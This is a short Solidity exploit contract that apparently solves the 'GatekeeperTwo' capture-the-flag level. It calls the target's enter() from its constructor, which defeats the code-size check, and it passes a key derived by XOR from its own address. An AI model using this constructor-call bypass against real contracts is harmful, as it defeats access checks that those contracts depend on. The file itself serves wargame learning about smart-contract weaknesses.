// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

interface GateKeeperTwo {
    function enter(bytes8) external returns (bool);
}

/**
 * @title FenceClimberTwo
 * @dev Bypass all gatekeeper two checks
 * @custom:dev-run-script ./scripts/deploy_with_ethers.ts
 */
contract FenceClimberTwo {
    constructor(address _contract) { // Call from constructor to pass the second gate since no code is yet present at the contract address
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (type(uint64).max)); // A XOR B = C <=> B = A XOR C
        bytes memory encodedParams = abi.encodeWithSignature(("enter(bytes8)"), key);
        _contract.call(encodedParams);
    }
}